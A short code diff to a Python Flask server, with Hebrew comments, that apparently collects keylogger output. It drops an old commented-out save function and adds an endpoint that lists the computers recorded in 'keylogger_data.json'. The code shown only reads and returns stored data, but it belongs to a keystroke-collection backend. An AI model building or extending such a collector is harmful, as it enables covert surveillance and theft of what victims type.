@@ -9,16 +9,6 @@ CORS(app)
 
 DATA_FILE = "keylogger_data.json"
 
-# def save_data(data):
-#     try:
-#         with open(DATA_FILE, "a") as file:
-#             json.dump(data, file, indent=4, ensure_ascii=False)
-#
-#            # file.write(",")# מפריד שורות לכל אובייקט JSON
-#            # file.write("\n")
-#     except Exception as e:
-#         print("Error saving data:", e)
-#
 
 def save_data(data):
     try:
@@ -50,6 +40,25 @@ def save_data(data):
 
 
 
+@app.route('/computers', methods=['GET'])
+def get_computers():
+    try:
+        # קורא את הנתונים מהקובץ
+        if os.path.exists(DATA_FILE):
+            with open(DATA_FILE, "r", encoding="utf-8") as file:
+                try:
+                    data = json.load(file)  # טוען JSON קיים
+                except json.JSONDecodeError:
+                    data = {}  # אם הקובץ ריק או תקול, מחזיר רשימה ריקה
+        else:
+            data = {}
+
+        computers = list(data.keys())  # לוקח רק את המפתחות הראשיים שהם שמות המחשבים
+        return jsonify(computers)
+
+    except Exception as e:
+        print("Error loading computers:", e)
+        return jsonify({"error": "Could not load computers"}), 500
 
 
 @app.route('/receive_data', methods=['POST'])
